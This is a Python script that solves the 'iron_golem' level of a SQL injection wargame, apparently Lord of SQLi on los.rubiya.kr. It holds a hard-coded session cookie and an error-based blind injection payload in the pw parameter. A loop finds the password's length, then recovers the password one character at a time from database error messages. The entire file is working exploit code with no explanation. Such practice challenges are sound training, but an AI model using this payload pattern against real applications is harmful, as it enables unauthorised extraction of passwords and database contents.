import requests
from string import digits,ascii_lowercase

session = requests.Session()
cookies = {"PHPSESSID": "7sp0e6btgarr92g7av9b5ddi58"}

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(length(pw)={},null,(select id union select pw));--+"
for i in range(100):
    r = requests.get(url.format(i), cookies=cookies)
    print(i,end='\r')
    if('Subquery returns more than' not in r.text):
        l=i
        break
print("Length :",l) 
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(pw like '{}%',null,(select id union select pw));--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Subquery returns more than' not in r.text and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw),end='\r')
            break
print("Password :", pw)
